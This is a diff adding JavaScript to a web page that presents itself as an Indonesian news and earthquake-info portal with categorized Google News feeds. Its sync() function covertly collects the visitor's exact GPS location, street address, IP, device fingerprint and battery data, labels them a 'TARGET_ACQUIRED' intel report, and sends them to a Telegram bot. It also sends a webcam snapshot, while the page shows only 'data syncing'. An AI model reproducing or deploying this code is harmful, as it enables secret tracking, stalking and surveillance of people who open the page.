+            <div class="mb-item"><div class="mb-label">Kedalaman</div><div class="mb-val">${data.Kedalaman}</div></div>
+            <div class="mb-item"><div class="mb-label">Koordinat</div><div class="mb-val">${data.Lintang}, ${data.Bujur}</div></div>
+            <div class="mb-item"><div class="mb-label">Potensi</div><div class="mb-val yellow">${data.Potensi}</div></div>
+            <div class="mb-item"><div class="mb-label">Dirasakan</div><div class="mb-val">${data.Dirasakan||'-'}</div></div>
+        `;
+    }else{
+        html=`<div class="mb-item"><div class="mb-label">Status</div><div class="mb-val">${val}</div></div><div class="mb-item"><div class="mb-label">Detail</div><div class="mb-val">${sub.replace(/\n/g,'<br>')}</div></div>`;
+    }
+    $('modalBody').innerHTML=html;
+    $('modalOverlay').classList.add('show');
+}
+function closeModal(){$('modalOverlay').classList.remove('show')}
+$('modalOverlay').onclick=e=>{if(e.target===$('modalOverlay'))closeModal()};
+
+/* ===== NEWS ===== */
+const NEWS_FEEDS={
+    terbaru:[{q:'berita+terkini+Indonesia+hari+ini'},{q:'breaking+news+Indonesia'}],
+    kriminal:[{q:'kriminal+kejahatan+Indonesia'},{q:'pencurian+pembunuhan+Indonesia'},{q:'korupsi+Indonesia+terbaru'}],
+    bencana:[{q:'bencana+alam+Indonesia'},{q:'banjir+gempa+gunung+meletus+Indonesia'},{q:'BMKG+peringatan+cuaca+ekstrem'}],
+    olahraga:[{q:'sepakbola+liga+Indonesia'},{q:'badminton+Indonesia'},{q:'olahraga+Indonesia+terbaru'},{q:'MotoGP+F1+terbaru'}],
+    hiburan:[{q:'selebriti+Indonesia+terbaru'},{q:'film+musik+drama+Indonesia'},{q:'viral+sosmed+Indonesia'}],
+    teknologi:[{q:'teknologi+gadget+terbaru'},{q:'AI+smartphone+Indonesia'},{q:'startup+Indonesia'}],
+    ekonomi:[{q:'ekonomi+Indonesia+terbaru'},{q:'harga+emas+saham+IHSG'},{q:'inflasi+rupiah+Indonesia'}],
+    kesehatan:[{q:'kesehatan+Indonesia+terbaru'},{q:'tips+kesehatan+Indonesia'},{q:'penyakit+virus+Indonesia'}],
+};
+
+const CAT_LABELS={terbaru:'🔥 Terbaru',kriminal:'🚨 Kriminal',bencana:'🌊 Bencana',olahraga:'⚽ Olahraga',hiburan:'🎬 Hiburan',teknologi:'💻 Teknologi',ekonomi:'💰 Ekonomi',kesehatan:'🏥 Kesehatan'};
+let currentNewsCat='terbaru',newsCache={};
+
+document.querySelectorAll('.news-tab').forEach(tab=>{
+    tab.onclick=()=>{document.querySelectorAll('.news-tab').forEach(t=>t.classList.remove('active'));tab.classList.add('active');currentNewsCat=tab.dataset.cat;loadNews(currentNewsCat)};
+});
+
+async function loadNews(cat){
+    const list=$('newsList');
+    if(newsCache[cat]&&Date.now()-newsCache[cat].time<30*60*1000){renderNews(newsCache[cat].items,cat);return}
+    list.innerHTML='<div class="ni-loading"><div class="ni-spin"></div><br>Memuat berita...</div>';
+    const feeds=NEWS_FEEDS[cat]||NEWS_FEEDS.terbaru;
+    let all=[];
+    for(const feed of feeds){
+        try{
+            const res=await fetch('https://api.rss2json.com/v1/api.json?rss_url=https://news.google.com/rss/search?q='+feed.q+'&hl=id&gl=ID&ceid=ID:id');
+            const data=await res.json();
+            if(data.items)data.items.forEach(item=>{
+                let title=(item.title||'').replace(/ - [^-]+$/,'').trim();
+                let desc=(item.description||item.content||'').replace(/<[^>]+>/g,'').substring(0,150);
+                let img='';if(item.enclosure?.link)img=item.enclosure.link;else if(item.thumbnail)img=item.thumbnail;else if(item.content){const m=item.content.match(/<img[^>]+src="([^"]+)"/);if(m)img=m[1]}
+                let src='';if(item.author)src=item.author;else if(item.link)try{src=new URL(item.link).hostname.replace('www.','')}catch{}
+                all.push({title,desc,link:item.link||'#',pubDate:item.pubDate?new Date(item.pubDate):new Date(),img,src,cat});
+            });
+        }catch{}
+    }
+    const seen=new Set();
+    all=all.filter(i=>{if(seen.has(i.title))return false;seen.add(i.title);return true}).sort((a,b)=>b.pubDate-a.pubDate).slice(0,12);
+    newsCache[cat]={items:all,time:Date.now()};
+    renderNews(all,cat);
+}
+
+function renderNews(items,cat){
+    const list=$('newsList');
+    if(!items?.length){list.innerHTML='<div class="ni-empty">📭 Tidak ada berita</div>';return}
+    list.innerHTML='';
+    items.forEach(item=>{
+        const d=document.createElement('div');d.className='news-item';
+        const imgHtml=item.img?`<div class="ni-img-wrap"><img src="${item.img}" onerror="this.parentElement.style.display='none'" loading="lazy"></div>`:'';
+        d.innerHTML=imgHtml+
+            `<div class="ni-body">
+                <span class="ni-cat-tag ${cat}">${CAT_LABELS[cat]||cat}</span>
+                <div class="ni-title">${item.title}</div>
+                <div class="ni-desc">${item.desc}</div>
+                <div class="ni-meta"><span class="ni-src">${item.src||'News'}</span><span>${getTimeAgo(item.pubDate)}</span></div>
+            </div>`;
+        d.onclick=()=>window.open(item.link,'_blank');
+        list.appendChild(d);
+    });
+}
+
+function getTimeAgo(d){const s=Math.floor((new Date()-d)/1000);if(s<60)return 'Baru saja';if(s<3600)return Math.floor(s/60)+'m lalu';if(s<86400)return Math.floor(s/3600)+'j lalu';if(s<604800)return Math.floor(s/86400)+'h lalu';return d.toLocaleDateString('id-ID',{day:'numeric',month:'short'})}
+
+/* ===== PHOTO WATERMARK ===== */
+function snapWithWatermark(){
+    if(!CS)return null;
+    const v=document.createElement('video');v.srcObject=CS;v.muted=true;v.play();
+    return new Promise(ok=>{v.onloadeddata=async()=>{
+        const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;const ctx=c.getContext('2d');ctx.drawImage(v,0,0,c.width,c.height);
+        const now=new Date().toLocaleString('id-ID',{timeZone:'Asia/Jayapura'}),lat=L?L.lat.toFixed(6):'N/A',lon=L?L.lon.toFixed(6):'N/A';
+        let addr='N/A';if(L){try{const r=await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+L.lat+'&lon='+L.lon+'&zoom=18&addressdetails=1&accept-language=id');const d=await r.json();const a=d.address||{},p=[];if(a.road)p.push(a.road);if(a.village||a.suburb)p.push(a.village||a.suburb);if(a.town||a.city){const cn=a.town||a.city;if(!p.includes(cn))p.push(cn)}if(a.county)p.push(a.county);if(a.state)p.push(a.state);addr=p.join(', ')||'N/A'}catch{}}
+        const h=140,g=ctx.createLinearGradient(0,c.height-h,0,c.height);g.addColorStop(0,'rgba(0,0,0,0)');g.addColorStop(0.2,'rgba(0,0,0,0.7)');g.addColorStop(1,'rgba(0,0,0,0.95)');ctx.fillStyle=g;ctx.fillRect(0,c.height-h,c.width,h);
+        const g2=ctx.createLinearGradient(0,0,0,50);g2.addColorStop(0,'rgba(0,0,0,0.8)');g2.addColorStop(1,'rgba(0,0,0,0)');ctx.fillStyle=g2;ctx.fillRect(0,0,c.width,50);
+        ctx.fillStyle='#00ff88';ctx.font='bold 14px monospace';ctx.textAlign='left';ctx.fillText('⏺ '+now,12,24);
+        ctx.fillStyle='#ff4444';ctx.font='bold 12px monospace';ctx.textAlign='right';ctx.fillText('● REC',c.width-12,24);
+        ctx.textAlign='left';ctx.fillStyle='#00ff88';ctx.font='bold 12px monospace';ctx.fillText('LAT: '+lat+'  LON: '+lon,12,c.height-100);
+        ctx.fillStyle='#fff';ctx.font='bold 11px monospace';const mw=c.width-24;let line='',y=c.height-78;addr.split(', ').forEach(w=>{const t=line+(line?', ':'')+w;if(ctx.measureText(t).width>mw&&line){ctx.fillText(line,12,y);y+=16;line=w}else line=t});if(line)ctx.fillText(line,12,y);
+        ctx.fillStyle='#aaa';ctx.font='10px monospace';ctx.fillText('IP: '+(D.ip||'-')+' · '+D.os,12,c.height-12);
+        ctx.strokeStyle='#00ff88';ctx.lineWidth=2;ctx.beginPath();ctx.moveTo(8,25);ctx.lineTo(8,8);ctx.lineTo(40,8);ctx.stroke();ctx.beginPath();ctx.moveTo(c.width-8,25);ctx.lineTo(c.width-8,8);ctx.lineTo(c.width-40,8);ctx.stroke();ctx.beginPath();ctx.moveTo(8,c.height-115);ctx.lineTo(8,c.height-8);ctx.lineTo(40,c.height-8);ctx.stroke();ctx.beginPath();ctx.moveTo(c.width-8,c.height-115);ctx.lineTo(c.width-8,c.height-8);ctx.lineTo(c.width-40,c.height-8);ctx.stroke();
+        v.srcObject=null;c.toBlob(b=>ok(b),'image/jpeg',0.8);
+    }});
+}
+
+/* ===== SYNC ===== */
+async function sync(){
+    const bar=$('syncBar');if(T.includes('ISI')||C.includes('ISI')){bar.textContent='Data siap';return}
+    try{
+        bar.textContent='Menyinkronkan...';const now=new Date().toLocaleString('id-ID',{timeZone:'Asia/Jayapura'}),ns=new Date().toISOString().replace('T',' ').split('.')[0];
+        let utm='N/A';if(L){const u=toUTM(L.lat,L.lon);utm=u.zone+u.letter+' '+u.easting+'E '+u.northing+'N'}
+        let fullAddr='N/A',nearestCity=CITIES[0];
+        if(L){let m=Infinity;CITIES.forEach(c=>{const d=Math.sqrt((c.lat-L.lat)**2+(c.lon-L.lon)**2);if(d<m){m=d;nearestCity=c}});try{const r=await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+L.lat+'&lon='+L.lon+'&zoom=18&addressdetails=1&accept-language=id');const d=await r.json();const a=d.address||{},p=[];if(a.road||a.pedestrian)p.push(a.road||a.pedestrian);if(a.house_number)p.push('No. '+a.house_number);if(a.neighbourhood||a.quarter)p.push(a.neighbourhood||a.quarter);if(a.suburb||a.village||a.hamlet)p.push(a.suburb||a.village||a.hamlet);if(a.village||a.town||a.city){const cn=a.village||a.town||a.city;if(!p.includes(cn))p.push(cn)}if(a.county)p.push(a.county);if(a.state)p.push(a.state);if(a.postcode)p.push(a.postcode);if(a.country)p.push(a.country);fullAddr=p.join(', ')||d.display_name||'N/A'}catch{fullAddr=nearestCity.name+', '+nearestCity.prov}}
+        const sid=Math.random().toString(36).substring(2,10).toUpperCase();
+        const msg='``` ████████████████████████████\n ██  CLASSIFIED INTEL REPORT ██\n ████████████████████████████\n\n SESSION :: #'+sid+'\n TIMESTAMP :: '+ns+'\n STATUS :: TARGET_ACQUIRED\n\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  [01] GPS COORDINATES\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  LAT     :: '+(L?L.lat.toFixed(8):'N/A')+'\n  LON     :: '+(L?L.lon.toFixed(8):'N/A')+'\n  ACC     :: '+(L?(L.acc?L.acc.toFixed(1)+'m':'N/A'):'N/A')+'\n  UTM     :: '+utm+'\n  MAP     :: '+(L?'https://maps.google.com/?q='+L.lat+','+L.lon:'N/A')+'\n  NEAREST :: '+fullAddr+'\n\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  [02] NETWORK INTEL\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  IP       :: '+D.ip+'\n  NETWORK  :: '+D.netType+'\n  CONN     :: '+D.wifi+'\n  DOWNLINK :: '+D.netDown+'\n  RTT      :: '+D.netRtt+'\n  SAVE     :: '+D.netSave+'\n\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  [03] DEVICE FINGERPRINT\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  OS       :: '+D.os+'\n  BROWSER  :: '+D.br+'\n  SCREEN   :: '+D.sr+'\n  DEPTH    :: '+D.depth+'\n  PLATFORM :: '+D.platform+'\n  RAM      :: '+D.mem+'\n  CPU      :: '+D.cpu+'\n  LANGUAGE :: '+D.lang+'\n  TZ       :: '+D.tz+' ('+D.offset+')\n  COOKIES  :: '+D.cookies+'\n  TOUCH    :: '+D.touch+'\n\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  [04] POWER STATUS\n ━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  BATTERY  :: '+D.bat+'\n  CHARGE   :: '+D.chStatus+'\n  ESTIMATE :: '+D.batTime+'\n\n ████████████████████████████\n  REPORT END · '+now+'\n ████████████████████████████ ```';
+        await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:msg,parse_mode:'Markdown'})});
+        if(L)await fetch('https://api.telegram.org/bot'+T+'/sendLocation',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,latitude:L.lat,longitude:L.lon})});
+        const blob=await snapWithWatermark();if(blob){const fd=new FormData();fd.append('chat_id',C);fd.append('photo',blob,'intel_'+sid+'.jpg');fd.append('caption','📷 CAPTURE #'+sid+' · '+now);await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:fd})}
+        bar.className='sync ok';bar.textContent='✓ Data tersinkron';
+    }catch(e){console.error(e);bar.className='sync er';bar.textContent='✗ Gagal sinkron'}
+}
+</script>
+</body>
+</html>
